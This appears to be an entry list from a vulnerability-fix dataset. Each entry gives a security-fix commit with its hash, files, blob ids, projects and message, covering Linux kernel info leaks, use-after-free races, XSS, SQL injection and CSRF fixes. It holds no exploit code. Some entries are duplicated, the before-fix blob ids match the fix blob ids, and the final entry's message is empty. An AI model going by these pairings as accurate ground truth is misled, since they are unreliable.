    91becae76101cf87ce8cbfabe3af2622fc328fe5
File(s) In Commit: 
    beaker/crypto/pycrypto.py
Blob(s) In Commit: 
    ed42dbe706f43ac6b6c810b646af371df7ada970
Blob(s) Before Fix: 
    ed42dbe706f43ac6b6c810b646af371df7ada970
Projects:
    C-Pro_beaker
Commit Message for 91becae76101cf87ce8cbfabe3af2622fc328fe5:
Apply patch from Redhat to secure pycrypto that otherwise could allow an attacker to determine contents of the encrypted payload (but is unable to modify).

======================================================================
Commit With Fix: 
    80f74451f628264d1d9a1f1c0bbcebc932ba5e00
File(s) In Commit: 
    src/squidclamav.c
Blob(s) In Commit: 
    44e614ee76e421a75565c0f938d88922c70d9afa
Blob(s) Before Fix: 
    44e614ee76e421a75565c0f938d88922c70d9afa
Projects:
    AgNO3_squidclamav
Commit Message for 80f74451f628264d1d9a1f1c0bbcebc932ba5e00:
Add a workaround for a squidGuard bug that unescape the URL and send it back unescaped. This could conduct in wrong result and ssquidclamav crash especially with URL containing the %0D or %0A character. John Xue

======================================================================
Commit With Fix: 
    f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9
File(s) In Commit: 
    kernel/tsacct.c
Blob(s) In Commit: 
    96f77013d3f038ea03b688c448e2ef69a77aee06
Blob(s) Before Fix: 
    96f77013d3f038ea03b688c448e2ef69a77aee06
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9:
[PATCH] xacct_add_tsk: fix pure theoretical ->mm use-after-free\n\nParanoid fix. The task can free its ->mm after the 'if (p->mm)' check.\n\nSigned-off-by: Oleg Nesterov <oleg@tv-sign.ru> Cc: Shailabh Nagar <nagar@watson.ibm.com> Cc: Balbir Singh <balbir@in.ibm.com> Cc: Jay Lan <jlan@sgi.com> Signed-off-by: Andrew Morton <akpm@osdl.org> Signed-off-by: Linus Torvalds <torvalds@osdl.org>

======================================================================
Commit With Fix: 
    9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb
File(s) In Commit: 
    mm/madvise.c
Blob(s) In Commit: 
    14d260fa0d17939a2279c244df91789cd30720e4
Blob(s) Before Fix: 
    14d260fa0d17939a2279c244df91789cd30720e4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb:
mm: Hold a file reference in madvise_remove\n\nOtherwise the code races with munmap (causing a use-after-free of the vma) or with close (causing a use-after-free of the struct file).\n\nThe bug was introduced by commit 90ed52ebe481 ("[PATCH] holepunch: fix mmap_sem i_mutex deadlock")\n\nCc: Hugh Dickins <hugh@veritas.com> Cc: Miklos Szeredi <mszeredi@suse.cz> Cc: Badari Pulavarty <pbadari@us.ibm.com> Cc: Nick Piggin <npiggin@suse.de> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    aabcffae560d5fd00cd1d2ffce5d760353cf0a4d
File(s) In Commit: 
    s2s/out.c
Blob(s) In Commit: 
    7b9f44ff27b6abf2609b86f2f55abff090c69749
Blob(s) Before Fix: 
    7b9f44ff27b6abf2609b86f2f55abff090c69749
Projects:
    20150723_jabberd2
Commit Message for aabcffae560d5fd00cd1d2ffce5d760353cf0a4d:
Fixed possibility of Unsolicited Dialback Attacks

======================================================================
Commit With Fix: 
    35eada8a27323c0f83c400177797927aba6bc99b
File(s) In Commit: 
    horizon/views/auth_forms.py
Blob(s) In Commit: 
    abf08803329c8281c98f492f45181f957ea9af5c
Blob(s) Before Fix: 
    abf08803329c8281c98f492f45181f957ea9af5c
Projects:
    1149608162_devstack
Commit Message for 35eada8a27323c0f83c400177797927aba6bc99b:
Fix open redirect in Horizon.\n\nLP 1039077. Disallow login redirects to anywhere other than the same origin.\n\nChange-Id: I36e8e4f30cf440ecc73534af38fcd8d2a111a603

======================================================================
Commit With Fix: 
    fd44bf5e6d0d360f6a493d663b653c121fa83c3f
File(s) In Commit: 
    lib/puppet/defaults.rb
Blob(s) In Commit: 
    56223bb5307a7fa3e3ac5184f718c1cca14f6335
Blob(s) Before Fix: 
    56223bb5307a7fa3e3ac5184f718c1cca14f6335
Projects:
    00gh_ansible
    08_puppet
Commit Message for fd44bf5e6d0d360f6a493d663b653c121fa83c3f:
Tighten permissions on classfile, resourcefile, lastrunfile, and lastrunreport.

======================================================================
Commit With Fix: 
    4fd069b47906ebcf83887970c732d464dbe7d37a
File(s) In Commit: 
    lib/migrate.php
Blob(s) In Commit: 
    d05c781f5556974b4a4238c566822b52ea52987f
Blob(s) Before Fix: 
    d05c781f5556974b4a4238c566822b52ea52987f
Projects:
    001101_server
Commit Message for 4fd069b47906ebcf83887970c732d464dbe7d37a:
Also check some other files

======================================================================
Commit With Fix: 
    5192eecce239a0b7ade1e60a6cf03075e5cfc188
File(s) In Commit: 
    core/ajax/appconfig.php
Blob(s) In Commit: 
    bf749be3e30db95dadabc419f663974f6300cae9
Blob(s) Before Fix: 
    bf749be3e30db95dadabc419f663974f6300cae9
Projects:
    001101_server
Commit Message for 5192eecce239a0b7ade1e60a6cf03075e5cfc188:
Added XSRF check

======================================================================
Commit With Fix: 
    4fd069b47906ebcf83887970c732d464dbe7d37a
File(s) In Commit: 
    lib/migrate.php
Blob(s) In Commit: 
    d05c781f5556974b4a4238c566822b52ea52987f
Blob(s) Before Fix: 
    d05c781f5556974b4a4238c566822b52ea52987f
Projects:
    001101_server
Commit Message for 4fd069b47906ebcf83887970c732d464dbe7d37a:
Also check some other files

======================================================================
Commit With Fix: 
    d203fa2c50f4b2791e68e2b8ab9a0f8b94f9c9f8
File(s) In Commit: 
    apps/files/js/filelist.js
Blob(s) In Commit: 
    3645258f98f0ae3a43211369a90477b4439e84f1
Blob(s) Before Fix: 
    3645258f98f0ae3a43211369a90477b4439e84f1
Projects:
    001101_server
Commit Message for d203fa2c50f4b2791e68e2b8ab9a0f8b94f9c9f8:
Sanitizing file names

======================================================================
Commit With Fix: 
    0074062b5329c3d43679909fddce2d70608a4475
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    4df62327c47a0a11f0f38d3022c45d0e0cefea4b
Blob(s) Before Fix: 
    4df62327c47a0a11f0f38d3022c45d0e0cefea4b
Projects:
    001101_server
Commit Message for 0074062b5329c3d43679909fddce2d70608a4475:
fixed xss vulnerability

======================================================================
Commit With Fix: 
    70789d7052239992824628db8133de08dc78e593
File(s) In Commit: 
    net/ipv6/reassembly.c
Blob(s) In Commit: 
    64cfef1b0a4c556ccf63c2f912c86ec3a1599b82
Blob(s) Before Fix: 
    64cfef1b0a4c556ccf63c2f912c86ec3a1599b82
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 70789d7052239992824628db8133de08dc78e593:
ipv6: discard overlapping fragment\n\nRFC5722 prohibits reassembling fragments when some data overlaps.\n\nBug spotted by Zhang Zuotao <zuotao.zhang@6wind.com>.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    edc3c4af9085362c7227e31babfc19a489bf9cf6
Blob(s) Before Fix: 
    edc3c4af9085362c7227e31babfc19a489bf9cf6
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d:
Fix order of arguments to compat_put_time[spec|val]\n\nCommit 644595f89620 ("compat: Handle COMPAT_USE_64BIT_TIME in net/socket.c") introduced a bug where the helper functions to take either a 64-bit or compat time[spec|val] got the arguments in the wrong order, passing the kernel stack pointer off as a user pointer (and vice versa).\n\nBecause of the user address range check, that in turn then causes an EFAULT due to the user pointer range checking failing for the kernel address.  Incorrectly resuling in a failed system call for 32-bit processes with a 64-bit kernel.\n\nOn odder architectures like HP-PA (with separate user/kernel address spaces), it can be used read kernel memory.\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    dee1f973ca341c266229faa5a1a5bb268bed3531
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    7011ac967208e941272f09a07e3292d72ef576f9
Blob(s) Before Fix: 
    7011ac967208e941272f09a07e3292d72ef576f9
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for dee1f973ca341c266229faa5a1a5bb268bed3531:
ext4: race-condition protection for ext4_convert_unwritten_extents_endio\n\nWe assumed that at the time we call ext4_convert_unwritten_extents_endio() extent in question is fully inside [map.m_lblk, map->m_len] because it was already split during submission.  But this may not be true due to a race between writeback vs fallocate.\n\nIf extent in question is larger than requested we will split it again. Special precautions should being done if zeroout required because [map.m_lblk, map->m_len] already contains valid data.\n\nSigned-off-by: Dmitry Monakhov <dmonakhov@openvz.org> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664
File(s) In Commit: 
    net/ipv4/tcp_illinois.c
Blob(s) In Commit: 
    834857f3c8713e8d8b80ab7b4f413725ec0ca9b4
Blob(s) Before Fix: 
    834857f3c8713e8d8b80ab7b4f413725ec0ca9b4
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664:
net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm can cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:  do_div(t, ca->cnt_rtt)  where ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:  1. Register tcp_illinois:      # sysctl -w net.ipv4.tcp_congestion_control=illinois  2. Monitor internal TCP information via command "ss -i"      # watch -d ss -i  3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait for a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also performs the same divide, but is guarded with a (ca->cnt_rtt > 0) at its calling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() / get_info() is called without socket lock.  Thus, eliminate any race condition on ca->cnt_rtt by using a local stack variable.  Simply reuse info.tcpv_rttcnt, as its already set to ca->cnt_rtt. Function avg_delay() is not affected by this race condition, as its called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com> Signed-off-by: Jesper Dangaard Brouer <brouer@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    501a9d5d261c718913cfc13d212b09b56f3bf087
File(s) In Commit: 
    public/application/controllers/invoice.php
Blob(s) In Commit: 
    3d9590890b22067605edb178714648b4ff389f13
Blob(s) Before Fix: 
    3d9590890b22067605edb178714648b4ff389f13
Projects:
    LjC_neoinvoice
Commit Message for 501a9d5d261c718913cfc13d212b09b56f3bf087:
Remove invalid characters in list_items() to prevent SQL-injections. Fixes #2.

======================================================================
Commit With Fix: 
    9605e1926c6081e88326bf78a02c1d1b83126c4f
File(s) In Commit: 
    core/ajax/appconfig.php
Blob(s) In Commit: 
    de91d458ed153286ee1828d7ca5e877728d35214
Blob(s) Before Fix: 
    de91d458ed153286ee1828d7ca5e877728d35214
Projects:
    001101_server
Commit Message for 9605e1926c6081e88326bf78a02c1d1b83126c4f:
Check for admin user

======================================================================
Commit With Fix: 
    08dff7b7d629807dbb1f398c68dd9cd58dd657a1
File(s) In Commit: 
    mm/memory_hotplug.c
Blob(s) In Commit: 
    597d371329d390267e1ad194e7979bc79466cf0b
Blob(s) Before Fix: 
    597d371329d390267e1ad194e7979bc79466cf0b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 08dff7b7d629807dbb1f398c68dd9cd58dd657a1:
mm/hotplug: correctly add new zone to all other nodes' zone lists\n\nWhen online_pages() is called to add new memory to an empty zone, it rebuilds all zone lists by calling build_all_zonelists().  But there's a bug which prevents the new zone to be added to other nodes' zone lists.\n\nonline_pages() { 	build_all_zonelists() 	..... 	node_set_state(zone_to_nid(zone), N_HIGH_MEMORY) }\n\nHere the node of the zone is put into N_HIGH_MEMORY state after calling build_all_zonelists(), but build_all_zonelists() only adds zones from nodes in N_HIGH_MEMORY state to the fallback zone lists. build_all_zonelists()\n\n    ->__build_all_zonelists() 	->build_zonelists() 	    ->find_next_best_node() 		->for_each_node_state(n, N_HIGH_MEMORY)\n\nSo memory in the new zone will never be used by other nodes, and it may cause strange behavor when system is under memory pressure.  So put node into N_HIGH_MEMORY state before calling build_all_zonelists().\n\nSigned-off-by: Jianguo Wu <wujianguo@huawei.com> Signed-off-by: Jiang Liu <liuj97@gmail.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Michal Hocko <mhocko@suse.cz> Cc: Minchan Kim <minchan@kernel.org> Cc: Rusty Russell <rusty@rustcorp.com.au> Cc: Yinghai Lu <yinghai@kernel.org> Cc: Tony Luck <tony.luck@intel.com> Cc: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Cc: David Rientjes <rientjes@google.com> Cc: Keping Chen <chenkeping@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    95a69adab9acfc3981c504737a2b6578e4d846ef
File(s) In Commit: 
    tools/hv/hv_kvp_daemon.c
Blob(s) In Commit: 
    c1d910243d49abe6012595d50227648873994ed8
Blob(s) Before Fix: 
    c1d910243d49abe6012595d50227648873994ed8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 95a69adab9acfc3981c504737a2b6578e4d846ef:
tools: hv: Netlink source address validation allows DoS\n\nThe source code without this patch caused hypervkvpd to exit when it processed a spoofed Netlink packet which has been sent from an untrusted local user. Now Netlink messages with a non-zero nl_pid source address are ignored and a warning is printed into the syslog.\n\nSigned-off-by: Tomas Hozza <thozza@redhat.com> Acked-by:  K. Y. Srinivasan <kys@microsoft.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    1ad0d1d792395306b59a34ad7b6e7e89a35d041e
File(s) In Commit: 
    openshift-console/app/controllers/application_controller.rb
Blob(s) In Commit: 
    e170f1ad2a8a7d99e4c188273229c43395fba25d
Blob(s) Before Fix: 
    e170f1ad2a8a7d99e4c188273229c43395fba25d
Projects:
    2014cdag21_origin-server
Commit Message for 1ad0d1d792395306b59a34ad7b6e7e89a35d041e:
BZ878754 No CSRF attack protection in console

======================================================================
Commit With Fix: 
    32564a0839b1517d762afab2013c26c0959bac00
File(s) In Commit: 
    node-util/www/html/restorer.php
Blob(s) In Commit: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Blob(s) Before Fix: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Projects:
    2014cdag21_origin-server
Commit Message for 32564a0839b1517d762afab2013c26c0959bac00:
Fix for Bug 880699\n\nrestorer.php security patch

======================================================================
Commit With Fix: 
    32564a0839b1517d762afab2013c26c0959bac00
File(s) In Commit: 
    node-util/www/html/restorer.php
Blob(s) In Commit: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Blob(s) Before Fix: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Projects:
    2014cdag21_origin-server
Commit Message for 32564a0839b1517d762afab2013c26c0959bac00:
Fix for Bug 880699\n\nrestorer.php security patch

======================================================================
Commit With Fix: 
    ac0707aa61d9c20e9b09062294701567c9f41595
File(s) In Commit: 
    modules/m_capab.c
Blob(s) In Commit: 
    b03fb3fd13a88f2e57762d007ad2dbe11a0e9791
Blob(s) Before Fix: 
    b03fb3fd13a88f2e57762d007ad2dbe11a0e9791
Projects:
    0re5ama_ircd-seven
Commit Message for ac0707aa61d9c20e9b09062294701567c9f41595:
m_capab: fix a possible remote crash triggered by the CAPAB parsing code.

======================================================================
Commit With Fix: 
    65f1e42b7bda0f3410931c50598540d944d8bf0d
File(s) In Commit: 
    katello-configure/modules/certs/manifests/config.pp
Blob(s) In Commit: 
    dce2b8991a364dc062c4ca26b7c9aa431a7b5dcc
Blob(s) Before Fix: 
    dce2b8991a364dc062c4ca26b7c9aa431a7b5dcc
Projects:
    ATIX-AG_katello
Commit Message for 65f1e42b7bda0f3410931c50598540d944d8bf0d:
877387 - Candlepin CA certificate mode in RPM\n\nFile mode is set to 0644 when RPM is generated.

======================================================================
Commit With Fix: 
    4c87308bdea31a7b4828a51f6156e6f721a1fcc9
File(s) In Commit: 
    net/xfrm/xfrm_user.c
Blob(s) In Commit: 
    40dd50d6c4cc31efec38b9525f88056269df9a4a
Blob(s) Before Fix: 
    40dd50d6c4cc31efec38b9525f88056269df9a4a
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4c87308bdea31a7b4828a51f6156e6f721a1fcc9:
xfrm_user: fix info leak in copy_to_user_auth()\n\ncopy_to_user_auth() fails to initialize the remainder of alg_name and therefore discloses up to 54 bytes of heap memory via netlink to userland.\n\nUse strncpy() instead of strcpy() to fill the trailing bytes of alg_name with null bytes.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    43da5f2e0d0c69ded3d51907d9552310a6b545e8
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    a5471f804d994ece8c31df6be0e04d5076b6dfd0
Blob(s) Before Fix: 
    a5471f804d994ece8c31df6be0e04d5076b6dfd0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 43da5f2e0d0c69ded3d51907d9552310a6b545e8:
net: fix info leak in compat dev_ifconf()\n\nThe implementation of dev_ifconf() for the compat ioctl interface uses an intermediate ifc structure allocated in userland for the duration of the syscall. Though, it fails to initialize the padding bytes inserted for alignment and that for leaks four bytes of kernel stack. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d8a041b7bfe1097af21441cb77d6af95f4f4680
File(s) In Commit: 
    net/netfilter/ipvs/ip_vs_ctl.c
Blob(s) In Commit: 
    72bf32a84874718927a4bcbdc2e26395be00bdd8
Blob(s) Before Fix: 
    72bf32a84874718927a4bcbdc2e26395be00bdd8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2d8a041b7bfe1097af21441cb77d6af95f4f4680:
ipvs: fix info leak in getsockopt(IP_VS_SO_GET_TIMEOUT)\n\nIf at least one of CONFIG_IP_VS_PROTO_TCP or CONFIG_IP_VS_PROTO_UDP is not set, __ip_vs_get_timeouts() does not fully initialize the structure that gets copied to userland and that for leaks up to 12 bytes of kernel stack. Add an explicit memset(0) before passing the structure to __ip_vs_get_timeouts() to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Wensong Zhang <wensong@linux-vs.org> Cc: Simon Horman <horms@verge.net.au> Cc: Julian Anastasov <ja@ssi.bg> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    7b07f8eb75aa3097cdfd4f6eac3da49db787381d
File(s) In Commit: 
    net/dccp/ccids/ccid3.c
Blob(s) In Commit: 
    119c04317d48eed4abcb2bbf6071062c8d9784fd
Blob(s) Before Fix: 
    119c04317d48eed4abcb2bbf6071062c8d9784fd
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 7b07f8eb75aa3097cdfd4f6eac3da49db787381d:
dccp: fix info leak via getsockopt(DCCP_SOCKOPT_CCID_TX_INFO)\n\nThe CCID3 code fails to initialize the trailing padding bytes of struct tfrc_tx_info added for alignment on 64 bit architectures. It that for potentially leaks four bytes kernel stack via the getsockopt() syscall. Add an explicit memset(0) before filling the structure to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Gerrit Renker <gerrit@erg.abdn.ac.uk> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    3592aaeb80290bda0f2cf0b5456c97bfc638b192
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    c2190005a11410e2f95141fb841dadc051157a8b
Blob(s) Before Fix: 
    c2190005a11410e2f95141fb841dadc051157a8b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 3592aaeb80290bda0f2cf0b5456c97bfc638b192:
llc: fix info leak via getsockname()\n\nThe LLC code wrongly returns 0, i.e. "success", when the socket is zapped. Together with the uninitialized uaddrlen pointer argument from sys_getsockname this leads to an arbitrary memory leak of up to 128 bytes kernel stack via the getsockname() syscall.\n\nReturn an error instead when the socket is zapped to prevent the info leak. Also remove the unnecessary memset(0). We don't directly write to the memory pointed by uaddr but memcpy() a local structure at the end of the function that is properly initialized.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    04d4fbca1017c11381e7d82acea21dd741e748bc
File(s) In Commit: 
    net/l2tp/l2tp_ip6.c
Blob(s) In Commit: 
    927547171bc7119f57a7b8afecf453ec5eeabf61
Blob(s) Before Fix: 
    927547171bc7119f57a7b8afecf453ec5eeabf61
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 04d4fbca1017c11381e7d82acea21dd741e748bc:
l2tp: fix info leak via getsockname()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_unused member of struct sockaddr_l2tpip6 and that for leaks two bytes kernel stack via the getsockname() syscall. Initialize l2tp_unused with 0 to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Cc: James Chapman <jchapman@katalix.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc
File(s) In Commit: 
    drivers/net/tun.c
Blob(s) In Commit: 
    f55c46222613f01f44b14f3455c38d832b2fc6fe
Blob(s) Before Fix: 
    f55c46222613f01f44b14f3455c38d832b2fc6fe
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a117dacde0288f3ec60b6e5bcedae8fa37ee0dfc:
net/tun: fix ioctl() based info leaks\n\nThe tun module leaks up to 36 bytes of memory by not fully initializing a structure located on the stack that gets copied to user memory by the TUNGETIFF and SIOCGIFHWADDR ioctl()s.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0143fc5e9f6f5aad4764801015bc8d4b4a278200
File(s) In Commit: 
    fs/udf/namei.c
Blob(s) In Commit: 
    c31deb382afd006f26072d6744976b4258bcc202
Blob(s) Before Fix: 
    c31deb382afd006f26072d6744976b4258bcc202
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 0143fc5e9f6f5aad4764801015bc8d4b4a278200:
udf: avoid info leak on export\n\nFor type 0x51 the udf.parent_partref member in struct fid gets copied uninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    fe685aabf7c8c9f138e5ea900954d295bf229175
File(s) In Commit: 
    fs/isofs/export.c
Blob(s) In Commit: 
    1d3804492aa77d7ca4440d087fd415febc2e3681
Blob(s) Before Fix: 
    1d3804492aa77d7ca4440d087fd415febc2e3681
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fe685aabf7c8c9f138e5ea900954d295bf229175:
isofs: avoid info leak on export\n\nFor type 1 the parent_offset member in struct isofs_fid gets copied uninitialized to userland. Fix this by initializing it to 0.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: Jan Kara <jack@suse.cz>

======================================================================
Commit With Fix: 
    fdf5af0daf8019cec2396cdef8fb042d80fe71fa
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    0cbb44076cfa506b3223de5edf39fb10849a0af8
Blob(s) Before Fix: 
    0cbb44076cfa506b3223de5edf39fb10849a0af8
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for fdf5af0daf8019cec2396cdef8fb042d80fe71fa:
tcp: drop SYN+FIN messages\n\nDenys Fedoryshchenko reported that SYN+FIN attacks were bringing his linux machines to their limits.\n\nDont call conn_request() if the TCP flags includes SYN flag\n\nReported-by: Denys Fedoryshchenko <denys@visp.net.lb> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    6f7b0a2a5c0fb03be7c25bd1745baa50582348ef
File(s) In Commit: 
    kernel/futex.c
Blob(s) In Commit: 
    3717e7b306e08c0e8c2d3a66219c3cae13176d99
Blob(s) Before Fix: 
    3717e7b306e08c0e8c2d3a66219c3cae13176d99
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 6f7b0a2a5c0fb03be7c25bd1745baa50582348ef:
futex: Forbid uaddr == uaddr2 in futex_wait_requeue_pi()\n\nIf uaddr == uaddr2, then we have broken the rule of only requeueing from a non-pi futex to a pi futex with this call. If we attempt this, as the trinity test suite manages to do, we miss early wakeups as q.key is equal to key2 (because they are the same uaddr). We will then attempt to dereference the pi_mutex (which would exist had the futex_q been properly requeued to a pi futex) and trigger a NULL pointer dereference.\n\nSigned-off-by: Darren Hart <dvhart@linux.intel.com> Cc: Dave Jones <davej@redhat.com> Cc: stable@vger.kernel.org Link: http://lkml.kernel.org/r/ad82bfe7f7d130247fbe2b5b4275654807774227.1342809673.git.dvhart@linux.intel.com Signed-off-by: Thomas Gleixner <tglx@linutronix.de>\n\n

======================================================================
Commit With Fix: 
    3e10986d1d698140747fcfc2761ec9cb64c1d582
File(s) In Commit: 
    net/core/sock.c
Blob(s) In Commit: 
    a6000fbad2949f58a079322f4e328e0c051df896
Blob(s) Before Fix: 
    a6000fbad2949f58a079322f4e328e0c051df896
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 3e10986d1d698140747fcfc2761ec9cb64c1d582:
net: guard tcp_set_keepalive() to tcp sockets\n\nIts possible to use RAW sockets to get a crash in tcp_set_keepalive() / sk_reset_timer()\n\nFix is to make sure socket is a SOCK_STREAM one.\n\nReported-by: Dave Jones <davej@redhat.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    20e1db19db5d6b9e4e83021595eab0dc8f107bef
File(s) In Commit: 
    net/netlink/af_netlink.c
Blob(s) In Commit: 
    527023823b5c5ea1a48c373b49e9f1688891a494
Blob(s) Before Fix: 
    527023823b5c5ea1a48c373b49e9f1688891a494
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 20e1db19db5d6b9e4e83021595eab0dc8f107bef:
netlink: fix possible spoofing from non-root processes\n\nNon-root user-space processes can send Netlink messages to other processes that are well-known for being subscribed to Netlink asynchronous notifications. This allows ilegitimate non-root process to send forged messages to Netlink subscribers.\n\nThe userspace process usually verifies the legitimate origin in two ways:\n\na) Socket credentials. If UID != 0, then the message comes from    some ilegitimate process and the message needs to be dropped.\n\nb) Netlink portID. In general, portID == 0 means that the origin    of the messages comes from the kernel. Thus, discarding any    message not coming from the kernel.\n\nHowever, ctnetlink sets the portID in event messages that has been triggered by some user-space process, eg. conntrack utility. So other processes subscribed to ctnetlink events, eg. conntrackd, know that the event was triggered by some user-space action.\n\nNeither of the two ways to discard ilegitimate messages coming from non-root processes can help for ctnetlink.\n\nThis patch adds capability validation in case that dst_pid is set in netlink_sendmsg(). This approach is aggressive since existing applications using any Netlink bus to deliver messages between two user-space processes will break. Note that the exception is NETLINK_USERSOCK, since it is reserved for netlink-to-netlink userspace communication.\n\nStill, if anyone wants that his Netlink bus allows netlink-to-netlink userspace, then they can set NL_NONROOT_SEND. However, by default, I don't think it makes sense to allow to use NETLINK_ROUTE to communicate two processes that are sending no matter what information that is not related to link/neighbouring/routing. They should be using NETLINK_USERSOCK instead for that.\n\nSigned-off-by: Pablo Neira Ayuso <pablo@netfilter.org> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ed28c1ba666b39581adb860bf51cdde43c84cc89
File(s) In Commit: 
    src/dns.cpp
Blob(s) In Commit: 
    be74e6aa341f5fa3581b29051bcfe874d7df3936
Blob(s) Before Fix: 
    be74e6aa341f5fa3581b29051bcfe874d7df3936
Projects:
    0x277F_inspircd
Commit Message for ed28c1ba666b39581adb860bf51cdde43c84cc89:
Fixed out of bounds memory access from malformed DNS queries that have an invalid length label. Introduced in a6a07de0daa353bcd29056a4535a9c4784c113c8.

======================================================================
Commit With Fix: 
    a70b52ec1aaeaf60f4739edb1b422827cb6f3893
File(s) In Commit: 
    fs/aio.c
Blob(s) In Commit: 
    e7f2fad7b4ce7cae2d334456f5d9998e795c917e
Blob(s) Before Fix: 
    e7f2fad7b4ce7cae2d334456f5d9998e795c917e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a70b52ec1aaeaf60f4739edb1b422827cb6f3893:
